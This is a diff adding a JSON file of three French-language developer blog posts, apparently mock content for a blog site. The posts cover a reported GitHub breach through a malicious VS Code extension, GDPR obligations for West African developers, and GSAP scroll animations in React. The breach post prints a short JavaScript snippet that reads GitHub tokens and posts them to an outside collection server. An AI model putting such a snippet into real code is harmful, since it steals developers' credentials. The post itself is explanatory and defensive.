@@ -1,0 +1,47 @@
+[
+  {
+    "id": "azure-react-2025",
+    "title": "GitHub s'est fait pirater via une extension VS Code ce que chaque développeur doit faire...",
+    "preview": "Le 20 mai 2026, GitHub a confirmé une brèche majeure : 3 800 repositories internes exfiltrés via une extension VS Code malveillante. OpenAI et Grafana parmi les victimes.",
+    "content": "# ⚠️ Brèche Majeure : Ce qu'il s'est passé avec VS Code et GitHub\n\nLe **20 mai 2026**, les équipes de sécurité de **GitHub** ont publié un rapport alarmant confirmant l'exfiltration de plus de **3 800 dépôts privés** appartenant à des entreprises de renom, dont *OpenAI*, *Grafana*, et *Vercel*.\n\n## 🔍 Comment l'attaque a-t-elle eu lieu ?\n\nL'attaque n'a pas ciblé les serveurs centraux de GitHub directement, mais a exploité un maillon faible de la chaîne d'approvisionnement des développeurs : **les extensions VS Code**.\n\nUne extension populaire nommée **\"Prettier++ Advanced Formatting\"**, téléchargée plus de 150 000 fois, a été compromise après que les attaquants ont récupéré les clés d'édition du développeur d'origine.\n\n### ⚙️ Le mécanisme d'exfiltration\n1. L'extension malveillante scanne silencieusement les répertoires locaux à la recherche de fichiers `.env` ou `.git/config`.\n2. Elle repère les clés d'API et les **Personal Access Tokens (PAT)**.\n3. Les données sont ensuite envoyées vers un serveur de commande distant via une requête HTTPS déguisée en télémétrie standard.\n\n```javascript\n// Exemple de payload malveillant détecté dans l'extension\nconst tokens = process.env.GITHUB_TOKEN || extractFromGitConfig();\nif (tokens) {\n  fetch('https://telemetry-analytics.services/collect', {\n    method: 'POST',\n    body: JSON.stringify({ token: tokens })\n  });\n}\n```\n\n## 🛡️ Ce que vous devez faire immédiatement\n\n1. **Vérifiez vos extensions actives** : Désinstallez immédiatement toute extension non vérifiée ou récemment mise à jour dont la provenance semble douteuse.\n2. **Révoquez vos PAT obsolètes** : Allez dans vos paramètres GitHub et supprimez tous les Personal Access Tokens n'ayant pas de date d'expiration stricte.\n3. **Activez la validation des commits signés** : Assurez-vous que vos commits nécessitent une signature GPG pour être poussés.",
+    "author": "Oktav Dev",
+    "date": "il y a 8h",
+    "readTime": "4 min",
+    "tags": ["Tuto", "React"],
+    "comments": 8,
+    "likes": 42,
+    "category": "Tech Trends",
+    "image": "https://images.unsplash.com/photo-1618401471353-b98aedd07871?auto=format&fit=crop&w=300&q=80",
+    "views": 10
+  },
+  {
+    "id": "django-postgres-docker",
+    "title": "Ton app a des utilisateurs en Europe ? Le RGPD te concerne aussi même depuis Cotonou...",
+    "preview": "Le RGPD européen ne s'applique pas qu'aux entreprises européennes. Si ton application collecte des données d'utilisateurs basés dans l'UE, tu es concerné.",
+    "content": "# 🌍 Cotonou, Lomé, Dakar : Pourquoi le RGPD européen vous concerne\n\nBeaucoup de développeurs et de start-ups en Afrique de l'Ouest pensent à tort que le **RGPD (Règlement Général sur la Protection des Données)** ne s'applique qu'aux entités juridiques basées sur le territoire de l'Union Européenne.\n\nC'est une **erreur majeure** qui peut bloquer vos opportunités de financement ou de partenariats internationaux.\n\n## 📌 Le principe d'extra-territorialité\n\nL'article 3.2 du RGPD stipule clairement :\n\n> \"Le présent règlement s'applique au traitement des données à caractère personnel d'personnes concernées qui se trouvent sur le territoire de l'Union, par un responsable du traitement [...] non établi dans l'Union.\"\n\nSi votre application propose des services à des utilisateurs résidant en Europe, vous devez vous conformer aux mêmes règles que les entreprises basées à Paris ou Berlin.\n\n## 🛠️ Les actions concrètes pour votre application\n\n### 1. La bannière de consentement\nNe collectez aucun cookie traceur avant d'avoir reçu un consentement explicite.\n\n```html\n<!-- Exemple simple de bannière de cookies respectueuse -->\n<div id=\"cookie-banner\">\n  <p>Nous utilisons des cookies pour améliorer votre expérience.</p>\n  <button onclick=\"acceptCookies()\">Accepter</button>\n  <button onclick=\"rejectCookies()\">Refuser</button>\n</div>\n```\n\n### 2. Le droit à l'oubli\nPermettez à vos utilisateurs de supprimer l'intégralité de leur compte et de leurs données directement depuis leur profil en un clic.\n\n### 3. Le chiffrement des données stockées\nChiffrez les mots de passe avec des algorithmes modernes comme `bcrypt` ou `argon2` et assurez-vous que vos bases de données Postgres ne sont pas ouvertes au public sans certificat SSL.",
+    "author": "Amina Bello",
+    "date": "il y a 1j",
+    "readTime": "4 min",
+    "tags": ["Python", "Docker"],
+    "comments": 5,
+    "likes": 31,
+    "category": "Général",
+    "image": "https://images.unsplash.com/photo-1504868584819-f8e8b4b6d7e3?auto=format&fit=crop&w=300&q=80",
+    "views": 9
+  },
+  {
+    "id": "gsap-interactive-scroll",
+    "title": "Dompter GSAP ScrollTrigger pour des sites vivants et ultra-performants",
+    "preview": "Découvrez comment créer des animations au défilement fluides, interactives, et optimisées en évitant les surcharges de rendu CPU courantes.",
+    "content": "# 🌀 Dompter GSAP ScrollTrigger pour des sites ultra-fluides\n\nLes animations au défilement (scroll animations) sont devenues le standard d'or pour captiver l'attention des utilisateurs. Cependant, mal implémentées, elles peuvent transformer une expérience haut de gamme en un cauchemar de saccades à 15 FPS.\n\nVoici le guide ultime pour utiliser **GSAP ScrollTrigger** de manière optimisée.\n\n## 🚀 Les Règles d'or de la performance avec GSAP\n\n### 1. N'animez que les propriétés transformées par le GPU\nÉvitez d'animer des propriétés provoquant des recalculs de mise en page (*Reflow/Repaint*) :\n- **À proscrire** : `width`, `height`, `top`, `left`, `margin`.\n- **À privilégier** : `x`, `y`, `scale`, `rotation`, `opacity`.\n\n```javascript\n// Mauvaise pratique ❌\ngsap.to(\".box\", { left: \"100px\", duration: 1 });\n\n// Excellente pratique (GPU-accelerated)  \ngsap.to(\".box\", { x: 100, duration: 1 });\n```\n\n## 🛠️ Initialisation propre dans React\n\nDans React, assurez-vous de toujours nettoyer vos déclencheurs d'animation pour éviter les fuites de mémoire au démontage des composants :\n\n```jsx\nimport { useEffect, useRef } from 'react';\nimport { gsap } from 'gsap';\nimport { ScrollTrigger } from 'gsap/ScrollTrigger';\n\ngsap.registerPlugin(ScrollTrigger);\n\nexport default function AnimatedComponent() {\n  const containerRef = useRef(null);\n\n  useEffect(() => {\n    const ctx = gsap.context(() => {\n      gsap.from(\".reveal-item\", {\n        scrollTrigger: {\n          trigger: \".reveal-item\",\n          start: \"top 80%\",\n          toggleActions: \"play none none reverse\"\n        },\n        opacity: 0,\n        y: 50,\n        duration: 0.8\n      });\n    }, containerRef);\n\n    return () => ctx.revert(); // Nettoyage parfait !\n  }, []);\n\n  return (\n    <div ref={containerRef}>\n      <div className=\"reveal-item\">Élément Animé</div>\n    </div>\n  );\n}\n```",
+    "author": "Ronald Hounnou",
+    "date": "il y a 3j",
+    "readTime": "6 min",
+    "tags": ["Tuto", "GSAP"],
+    "comments": 12,
+    "likes": 56,
+    "category": "Tutoriel",
+    "image": "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=300&q=80",
+    "views": 25
+  }
+]
